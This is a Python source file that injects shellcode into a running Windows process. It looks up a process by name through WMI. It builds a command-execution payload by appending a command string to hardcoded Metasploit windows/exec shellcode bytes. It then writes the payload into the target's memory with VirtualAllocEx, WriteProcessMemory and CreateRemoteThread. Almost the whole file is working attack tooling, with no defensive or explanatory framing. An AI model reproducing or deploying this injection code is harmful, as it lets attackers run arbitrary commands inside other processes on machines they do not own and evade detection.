from ctypes import *
from win32com.client import GetObject

def getPID(processname):
	WMI = GetObject('winmgmts:')
	p = WMI.ExecQuery('select * from Win32_Process where Name="%s"' %(processname))
	if len(p) == 0:
		return 0
	return p[0].Properties_('ProcessId').Value


def generateShellcode(cmdString):
	# Windows Exec Shellcode Sourced from the Metasploit Framework 
    # http://www.rapid7.com/db/modules/payload/windows/exec
    
	shellcode = "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52" + \
	"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26" + \
	"\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d" + \
	"\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0" + \
	"\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b" + \
	"\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff" + \
	"\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d" + \
	"\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b" + \
	"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44" + \
	"\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b" + \
	"\x12\xeb\x86\x5d\x6a\x00\x8d\x85\xb9\x00\x00\x00\x50\x68" + \
	"\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95" + \
	"\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb" + \
	"\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5" + cmdString + "\x00"  
	return shellcode
	
# Injects shellcode: Takes in shellcode as string, converts to bytearray
def injectShellCode(pid, shellcode):
	shellCode = bytearray(shellcode)   
	process_handle = windll.kernel32.OpenProcess(0x1F0FFF, False, pid)	
	memory_allocation_variable = windll.kernel32.VirtualAllocEx(process_handle, None, len(shellcode), 0x1000, 0x40)
	windll.kernel32.WriteProcessMemory(process_handle, memory_allocation_variable, shellcode, len(shellcode), None)
	if not windll.kernel32.CreateRemoteThread(process_handle, None, 0, memory_allocation_variable, None, 0, None):
		return False
	return True
